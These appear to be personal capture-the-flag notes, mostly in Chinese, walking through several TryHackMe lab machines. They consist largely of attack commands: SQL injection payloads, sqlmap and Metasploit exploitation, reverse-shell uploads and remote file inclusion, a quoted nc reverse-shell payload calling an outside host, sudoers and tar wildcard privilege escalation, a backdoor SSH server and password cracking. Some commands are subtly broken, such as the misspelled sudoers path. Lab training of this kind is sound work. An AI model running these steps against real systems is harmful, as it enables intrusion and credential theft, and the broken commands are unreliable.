## step of start : 
	--> 1. nmap : 
		--> 收集有關電腦的資訊
		--> sudo nmap -sS -sV -sC -v -O -sN 10.10.203.207
	--> 2. Gobuster
		--> 找可用於上傳 shell 的目錄
		--> gobuster dir -u http://10.10.203.207:3333 -w /usr/share/dirb/wordlists/common.txt
	--> 3. upload payload 
		--> 10.10.203.207:3333/internal/uploads/pentestmonkey.phtml
		--> Check valid 副檔名 : 
			--> BurpSuite -- Intruder
		
		--> Reverse Shell
			--> cat /etc/passwd
	--> 4. root 
		--> SUID => GTFOBins => systemctl
## Basic Pentesting :
	--> 找到機器暴露的服務 : nmap 
		--> sudo nmap -sS -sV -sC -v -O 10.10.50.135
		=> linux_kernel | Apache Tomcat 9.0.7
	--> 隱藏目錄
		--> gobuster dir -u http://10.10.50.135:8080 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt

	--> 暴力破解用戶名和密碼 (brute forcing )
		--> port 445 : SMB --samba服務 : 
			--> enum4linux enum4linux 10.10.50.135
				--> Enum4linux是用來列舉 Windows 和 Samba系統資訊的工具
				=> S-1-22-1-1000 Unix User\kay (Local User)             
				=> S-1-22-1-1001 Unix User\jan (Local User) 
		--> find password
			--> Hydra是個並行登入破解器，支援多種協定進行攻擊
				--> hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.50.135 ssh 
				--> 
	--> 枚舉機器以查找任何特權升級向量
		--> ssh jan@10.10.50.135 | armando
		--> linPEAS 
			=> upload to ssh 
				--> curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
				--> scp linpeas.sh jan@10.10.50.135:/dev/shm
				--> chmod +x linpeas.sh
				--> ./linpeas.sh
	
	--> 您最終獲得的密碼是什麼？ 
		--> 讓 id_rsa 檔案與 JohnTheRipper 相容
			--> python3 /usr/share/john/ssh2john.py kay_id_rsa > johncompatible.txt
		--> 破解: 	
			--> john johncompatible.txt --wordlist=/usr/share/wordlists/rockyou.txt
		--> chmod 400 kay_id_rsa 
			=> ssh 公鑰的密碼 : beeswax

		--> jan@basic2:/dev/shm$ ssh -i /home/kay/.ssh/id_rsa kay@10.10.50.135 
## Normal : 
	-->  sudo nmap -sV -O 10.10.63.21
	--> Samba :
		--> 適用於Linux和 Unix的標準 Windows 互通程式套件。
		--> 它允許最終用戶存取和使用公司內部網路或互聯網上的文件、印表機和其他常用共用資源
		--> SMB 有兩個連接埠：
			--> 445 : NetBIOS
			--> 139 : Window 2000
		
		--> Nmap 能夠自動運行各種網路任務
		--> nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.63.21
			=> /usr/share/nmap/scripts/smb-enum-users.nse
			=> /usr/share/nmap/scripts/smb-enum-shares.nse
			
				=>\\10.10.63.21\IPC$: 
				=>\\10.10.63.21\anonymous: 
				=>\10.10.63.21\print$: 
	
		--> connect to SMB : 
			--> smbclient //10.10.63.21/anonymous
			--> smbget -R smb://10.10.63.21/anonymous
		
	rpcbind 服務 : 
		--> port 111 
		--> 將遠端過程呼叫（RPC）程式號碼轉換為通用位址的伺服器
		--> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.63.21
			--> 掛載點 mount : /var *
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ProFtpd : 
	 	--> FTP伺服器，相容於Unix和Windows系統
	 	--> nmap -sV -p21 => ProFtpd 1.3.5 
		
	Searchsploit
		--> 基本上只是exploit-db.com 的命令列搜尋工具
		--> searchsploit ProFtpd 1.3.5 
			=> mod_copy => SITE CPFR 和 SITE CPTO 指令
	fps : 
		--> 503 Bad sequence of commands (mean need root)		
		--> nc 10.10.63.21 21
			--> SITE CPFR /home/kenobi/.ssh/id_rsa
			--> SITE CPTO /var/tmp/id_rsa 
	mount : 
		--> 用 node:directory 參數
			--> 將表示為裝置的檔案系統安裝到由 directory 參數指定的目錄上。
			--> mount 10.10.63.21:/var /mnt/kenobiNFS 
		--> example : 	
			--> mkdir /mnt/kenobiNFS
			--> mount 10.10.63.21:/var /mnt/kenobiNFS (copy 10.10.63.21:/var to /mnt/kenobiNFS)
			--> cp /mnt/kenobiNFS/tmp/id_rsa . (copy on now directory )
			--> sudo chmod 600 id_rsa 
			--> ssh -i id_rsa kenobi@10.10.63.21
	
	SUID  :
		--> find / -perm -u=s -type f 2>/dev/null
			=> /usr/bin/menu
		--> 運行二進位文件
			--> /usr/bin/menu
		--> Strings : 用於在二進位檔案中尋找人類可讀的字串
			--> Strings /usr/bin/menu	
				=> found that curl use 	不完整路徑
					=> curl -I localhost
	不指定完整路徑
		--> 系統將查看 PATH 變數並在路徑中指定的所有位置中搜尋所需檔案
		--> export PATH=/tmp:$PATH
		
		--> cd /tmp
		--> echo /bin/sh > curl
		--> chmod 777 curl
		--> export PATH=/tmp:$PATH
		--> /usr/bin/menu
## Game Zone : 
	--> SQL : SELECT * FROM users WHERE username = :username AND password := password
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	SQLi
		=> admin' --
		=> admin' #
		=> admin'/*
		=> ' or 1=1--
		=> ' or 1=1#
		=> ' or 1=1/*
		=> ') or '1'='1--
		=> ') or ('1'='1--
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> burpsuite 
		--> /portal.php  => save to request.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	-->SQLMap
		--> 自動 SQL 注入和資料庫接管工具
		--> sqlmap -r request.txt --dbms=mysql --dump
			-r 使用您之前保存的攔截請求
			--dbms告訴 SQLMap 它是什麼類型的資料庫管理系統
			--dump嘗試輸出整個資料庫
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> sqlmap -r request.txt -D db --table
			=> fetching table for database: 'db'
		--> sqlmap -r request.txt --dump -D db -T users 
			=> | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> password :	
		--> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
		=> videogamer124
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> login 
		--> ssh agent47@10.10.144.38

		--> ssh -L 10000:localhost:10000 agent47@10.10.144.38
			=> ss -tulpn
				-t	顯示 TCP 套接字
				-u	顯示 UDP 套接字
				-l	僅顯示監聽套接字
				-p	顯示使用套接字的進程
				-n	不解析服務名稱
			=>  accessed browser on localhost:10000
				=> Webmin 1.580
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	vuln (root): 						
		--> searchsploit Webmin 1.580

		--> msfconsole : 
			--> search '/file/show.cgi'
			--> set password videogamer124
			--> set username agent47  
			--> set rhosts localhost
			--> set payload cmd/unix/reverse
			--> set lhost tun0
			--> set ssl false

			--> sessions -i 2
## Skynet : 
	--> email | samba  |  PentestMonkey |tar 
	--> https://tryhackme.com/r/room/skynet
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	infomation garthering : 
		--> nmap -sV -sS -T5 --script vuln 10.10.85.98 
			=> samba 
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> gobuster dir -u http:/10.10.85.98 -w /usr/share/dirb/wordlists/common.txt
			=>  /squirrelmail
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> enum4linux 10.10.85.98 
			=> S-1-22-1-1001 Unix User\milesdyson (Local User) 
			
			--> smbclient //10.10.85.98/Anonymous
				=> get attention.txt 
				=> get log1.txt
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> hydra -l milesdyson -P log1.txt 10.10.85.98 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
			=> [80][http-post-form] host: 10.10.85.98   login: milesdyson   password: cyborg007haloterminator
			
			=> new password : )s{A&2Z=F^n_E.B`
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	user :
		--> smbclient -U milesdyson //10.10.49.79/milesdyson
			=> get important.txt
				=> 1. Add features to beta CMS /45kra24zxs28v3yd
				=> 2. Work on T-800 Model 101 blueprints
				=> 3. Spend more time with my wife
		
		--> gobuster dir -u http://10.10.49.79/45kra24zxs28v3yd -w /usr/share/dirb/wordlists/common.txt
			=> /administrator 
			=> ip /45kra24zxs28v3yd/administrator 
			
		--> searchsploit Cuppa
			=> Remote File Inclusion
			--> get file : searchsploit -m php/webapps/25971.txt

		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		upload shell 
			--> pentestmonkey.php ( port 8888)
			--> python3 -m http.server
			--> nc -lvnp 8888
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> http://10.10.114.235/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.92.230:8000/pentestmonkey.php
			--> curl http://10.10.145.137/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.137.110:8000/pentestmonkey.php
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> python -c 'import pty;pty.spawn("/bin/bash")'
			--> bash -i 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	root : 
		--> cat /etc/crontab 
			=>  cd backups => backup.sh

		--> gtfobins : tar
			--> checkpoint[=NUMBER] — this option displays progress messages every NUMBERth record (default value is 10)
			--> checkpoint-action=ACTION — this option executes said ACTION on each checkpoint
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> cd /var/www/html 
			printf '#!/bin/bash\nchmod +s /bin/bash' > shell.
			echo "" > "--checkpoint-action=exec=sh shell.sh"
			echo "" >> --checkpoint=1
			/bin/bash -p 	
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
			touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
			touch "/var/www/html/--checkpoint=1"
			dir
			
			sudo su
## Daily Bugle 
	--> https://tryhackme.com/r/room/dailybugle
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	infomation garthing : 
		nmap -sS -sV -p- 10.10.11.199
			22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
			80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
			3306/tcp open  mysql   MariaDB (unauthorized)
		gobuster dir -u http://10.10.11.199 -w /usr/share/dirb/wordlists/common.txt
			/robots.txt
			/administrator  
		check CMS verion : 
			=> Joomla 3.7.0
			--> 使用joomscan
				--> joomscan是一个专门用于扫描Joomla CMS的工具。
				--> joomscan -u http://10.10.11.199 #此处ip为目标ip
					=> verion | admin page | path | Directory 
			--> 10.10.74.183/language/en-GB/en-GB.xml
		
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	exploit : 
		--> exploit-db :
			=> https://www.exploit-db.com/
			=> cve 
		--> searchsploit "joomla 3.7.0"
			--> Joomla! 3.7.0 - 'com_fields' SQL Injection 
		-->/usr/share/exploitdb/exploits/php/webapps/42033.txt
			=> cve 2017-8917
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		-->sqli : 
			3.7.- com sql 
			=> http:10.10.11.199/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)

			=> sqlmap -u "http://10.10.11.199/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
			=> wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
			python joomblah.py http://10.10.11.199
				=> Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']

		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
			=> https://github.com/XiphosResearch/exploits/tree/master/Joomblah
			=> wget https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
			=> sudo python2 joomblah.py http://10.10.74.183
			=> hash 
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> 查询hash值的加密方式
			=>  https://hashcat.net/wiki/doku.php?id=example_hashes
		--> john --wordlist=/usr/share/wordlists/rockyou.txt jonahhash.txt --format=bcrypt
			=> Jonah : spiderman123
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		http://10.10.55.152/administrator/index.php
		
		--> templates  (beez3)
		=> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
		--> 10.10.55.152/templates/beez3/index.php
		--> cd /home
			--> jjameson
		--> cd /var/www/html
			--> cat configuration
				=> public $password = 'nv5uz9r3ZEDzVjNu';

		--> su jjameson nv5uz9r3ZEDzVjNu
			=> ssh jjameson@10.10.55.152
			=> 27a260fe3cba712cfdedb1c86d80442e
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	root : 
		=> sudo -l 
			=> yum 
		--> https://gtfobins.github.io/
		a) 	
			apt-get install yum 
			https://github.com/jordansissel/fpm

			將 jjameson 用戶新增至 sudoers：
			echo 'echo "jjamson ALL=(root) NOPASSWORD: ALL" >> /etc/sudiers' > sudo.sh
			fpm -n root -s dir -t rpm -a all --before-install sudo.sh .

			sudp python3 -m http.server 80
			wget http://10.9.109.169/root-1.0–1.noarch.rpm
			sudo yum localinstall -y root-1.0-1.noarch.rpm
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		b) 
			TF=$(mktemp -d)
			cat >$TF/x<<EOF
			[main]
			plugins=1
			pluginpath=$TF
			pluginconfpath=$TF
			EOF

			cat >$TF/y.conf<<EOF
			[main]
			enabled=1
			EOF

			cat >$TF/y.py<<EOF
			import os
			import yum
			from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
			requires_api_version='2.1'
			def init_hook(conduit):
			  os.execl('/bin/sh','/bin/sh')
			EOF

			sudo yum -c $TF/x --enableplugin=y
			
			=> eec3d53292b1821868266858d7fa6f79
## Overpass 2 - Hacked
	--> https://tryhackme.com/r/room/overpass2hacked
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Forensics(Wireshark_pcap)
		--> https://hailstormsec.com/overpass-2/
			=> filter :http
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
	--> 初始存取權限 : reverse shell
		=> POST /development/upload.php HTTP/1.1
			=> Follow -> HTTP-Stream
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> access : 
			=> Payload.php 
				=> <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
			=> ip.src == 192.168.170.145
			=> /bin/sh 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> root: 
		=> su james
		=> Password: whenevernoteartinstant
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> 持久性
		=> git clone https://github.com/NinjaJc01/ssh-backdoor
			--> 
		-->  /etc/shadow 
			--> find / -name fasttrack.txt 2>/dev/null
			=> sudo john --wordlist=/usr/share/wordlists/fasttrack.txt shadow
				secret12         (bee)     
				abcd123          (szymex)     
				1qaz2wsx         (muirland)     
				secuirty3        (paradox)  
			=> sudo john --show shadow
				paradox:secuirty3:18464:0:99999:7:::
				szymex:abcd123:18464:0:99999:7:::
				bee:secret12:18464:0:99999:7:::
				muirland:1qaz2wsx:18464:0:99999:7:::

		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
		--> 分析 backdoor	
			--> wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
			--> ./ -h
			 標誌：
			     --version 顯示程式版本字串。
			    -h --help 顯示可用標誌、子指令和位置值參數的協助。
			    -p --port 用於偵聽 SSH 的本機連接埠（預設值：2222）
			    -i --interface 要偵聽的介面的 IP 位址（預設值：0.0.0.0）
			    -k --key SSH 伺服器私鑰的路徑（預設值：id_rsa）
			    -f --fingerprint SSH 指紋，不含 SSH-2.0- 前綴（預設值：OpenSSH_8.2p1 Debian-4）
			    -a --hash 後閘哈希值（預設值： 01fc2170e3)		
			    
			--> var hash string = 
			--> https://raw.githubusercontent.com/NinjaJc01/ssh-backdoor/master/main.go
			--> ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Hashcat
			--> hash := sha512.Sum512([]byte(password + salt))
			--> hash.txt => 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

			=> hashcat -h | grep SHA512
				=> 1710 | sha512($pass.$salt) | Raw Hash salted and/or iterated
				
			=> hashcat -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -O
				-m 代表哈希的類型
				1710代表 sha512 哈希加鹽
				-a 0代表直接攻擊模式
				-O優化標誌
				--> :november16
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> 駭客反擊
		--> ssh james@10.10.17.3 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
			=> november16
		--> ./.suid_bash -p
			=> /bin/bash -p can be root !













